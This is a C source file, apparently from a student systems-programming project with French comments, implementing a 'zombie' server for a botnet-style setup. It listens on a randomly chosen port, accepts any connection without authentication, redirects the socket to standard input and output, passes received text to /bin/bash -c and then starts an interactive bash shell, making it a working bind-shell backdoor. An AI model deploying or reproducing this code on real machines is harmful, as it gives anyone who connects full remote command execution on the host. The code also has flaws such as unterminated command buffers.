#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <fcntl.h>

#include "messages.h"
#include "utils_v2.h"

#define BACKLOG 5

volatile sig_atomic_t end = 0;

void endServerHandler(int sig)
{
  end = 1;
}

/**
 * PRE:  serverPort: a valid port number
 * POST: on success, binds a socket to 0.0.0.0:serverPort and listens to it ;
 *       on failure, displays error cause and quits the program
 * RES: return socket file descriptor
 */
int initSocketServer(int serverPort)
{
  int sockfd = ssocket();

  /* no socket error */

  sbind(serverPort, sockfd);

  /* no bind error */
  slisten(sockfd, BACKLOG);

  /* no listen error */
  return sockfd;
}



void launchCommand(void *arg1) {
  char *buffer = arg1;
  sexecl("/bin/bash", "bash", "-c", buffer, NULL);
}



void childProcess(void* arg1, void* arg2) {
   

  // récupération du pointeur du socketfd en argument
  int *sockfd = arg1;
  char *buffer = arg2;

  // redirige la sortie standard vers le socket
  int fdstdout = dup(1);
  int fdstdin = dup(0);
  dup2(*sockfd, 1);
  dup2(*sockfd, 0);

  fork_and_run1(launchCommand, buffer);
 

  //restauration de la sortie standard sur le fd1
  dup2(fdstdout, 1);
  sclose(fdstdout);

  dup2(fdstdin, 0);
  sclose(fdstdin);

  execl("/bin/bash", "bash", NULL);
  

} 



int main(int argc, char **argv)
{
	// StructMessage msg;

  int port;
  switch(randomIntBetween(1,10)) {
    case 1:
      port = SERVER_PORT_1;
      break;
    case 2:
      port = SERVER_PORT_2;
      break;
    case 3:
      port = SERVER_PORT_3;
      break;
    case 4:
      port = SERVER_PORT_4;
      break;
    case 5:
      port = SERVER_PORT_5;
      break;
    case 6:
      port = SERVER_PORT_6;
      break;
    case 7:
      port = SERVER_PORT_7;
      break;
    case 8:
      port = SERVER_PORT_8;
      break;
    case 9:
      port = SERVER_PORT_9;
      break;
    case 10:
      port = SERVER_PORT_10;
      break;

  }
	
  
	int sockfd = initSocketServer(port);
	printf("Le zombie tourne sur le port : %i \n", port);
	
	// setsockopt -> to avoid Address Already in Use
  int option = 1;
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(int));


	
	while (!end)
  {
    // traitement parent
    /* client trt */
    int newsockfd = saccept(sockfd);

    // ssize_t ret = sread(newsockfd, &msg, sizeof(msg));

    // printf("Commande envoyée : %s\n", msg.messageText);

    char buffer[256];

    int nbCharRd;

    dup2(newsockfd, 0);
  
    while((nbCharRd = sread(0, buffer, 256)) > 0)  {

      // fork_and_run2(childProcess, &newsockfd, buffer);
      fork_and_run2(childProcess, &newsockfd, buffer);

    }

    
    
    // msg.code = RESULT_MESSAGE;
    // strcpy(msg.messageText, "okok");
    
    // nwrite(newsockfd, &msg, sizeof(msg));
    printf("fini");
  }


  
  
  sclose(sockfd);
}
